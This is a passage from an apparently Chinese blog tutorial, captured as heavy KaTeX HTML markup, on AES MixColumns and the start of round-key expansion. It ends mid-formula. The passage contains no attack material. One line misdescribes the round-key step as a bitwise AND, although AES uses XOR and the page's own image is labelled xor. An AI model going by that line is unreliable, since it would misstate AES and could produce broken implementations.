aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>，同时模上<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^4+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。最后的结果如上图。</p><p>然后我们把最后结果的每个次数的x前面的系数对应到新的列上。就完成了列混合。</p><p>实际上我们计算列混合的结果时不用考虑的这么多，只需要利用最后的d和c之间的结果即可，实际上它们之间的关系就是乘上了一个矩阵。</p><p><img src="https://upyun.wuuconix.link/image-20211004135915493.png" alt="列混合" /></p><p>即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>2</mn><mo mathvariant="normal">′</mo></msup><msub><mi>C</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msup><mo>+</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>3</mn><mo mathvariant="normal">′</mo></msup><msub><mi>C</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msup><mo>+</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><msub><mi>C</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msup><mo>+</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><msub><mi>C</mi><mrow><mn>3</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub></mrow><annotation encoding="application/x-tex">d_{0,0}=&#x27;02&#x27;C_{0,0}+&#x27;03&#x27;C_{1,0}+&#x27;01&#x27;C_{2,0}+&#x27;01&#x27;C_{3,0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.286108em;"></span><span class="mord">0</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mbin">+</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.286108em;"></span><span class="mord">0</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mbin">+</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.286108em;"></span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mbin">+</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.286108em;"></span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></p><p>和之前的结果时一致的。</p><p>值得注意的是，我们一开始的方法多项式表面上最高此次为3，因为没有将C实际转化为多项式，所以模的是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^4+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</p><p>而现在我们根据结论的时候，是需要将C展开为多项式的，故不能再模<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^4+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，需要模那个神奇的多项式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^8+x^4+x^3+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</p><p>以下为例子。</p><p><img src="https://upyun.wuuconix.link/image-20211004140407324.png" alt="列混合例子" /></p><p>ok，最后一个步骤就是和轮密钥按位与，十分简单。</p><p><img src="https://upyun.wuuconix.link/image-20211004141022694.png" alt="xor" /></p><p>那轮密钥是怎么产生的呢？因为AES一共有十轮，所以我们需要根据初始128位的密码进行生成之后的密钥。</p><p><img src="https://upyun.wuuconix.link/image-20211004143905569.png" alt="密钥形式转化" /></p><p>我们先把128位的密钥，即16个字节的密钥的形式换一些，把第一列写成<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>o</mi></msub></mrow><annotation encoding="application/x-tex">w_o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>实际上</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mn>0</mn></msub><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">w_0=\begin{pmatrix}k_{0} \\k_{1} \\k_{2} \\k_{3} \\\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:4.80006em;vertical-align:-2.15003em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500299999999997em;"><span style="top:-1.6499900000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-2.805em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.4050100000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.65003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15003em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500299999999997em;"><span style="top:-1.6499900000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-2.805em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.4050100000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.65003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15003em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>然后我们就可以得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">w_0,w_1,w_2,w_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。这实际上就是初始密钥，没有任何变化，我们只是换种形式表示。</p><p>然后我们需要以此位基础生成第一轮的轮密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>5</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>6</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>7</mn></msub></mrow><annotation encoding="application/x-tex">w_4,w_5,w_6,w_7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>公式如下</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⊕</mo><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>4</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>4</mn><mi mathvariant="normal">≠</mi><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>⊕</mo><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>4</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>4</mn><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}w(i)=w(i-1)\oplus w(i-4)&amp; i\ mod\ 4\neq 0\\w(i)=g(w(i-1))\oplus w(i-4)&amp; i\ mod\ 4 = 0\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span 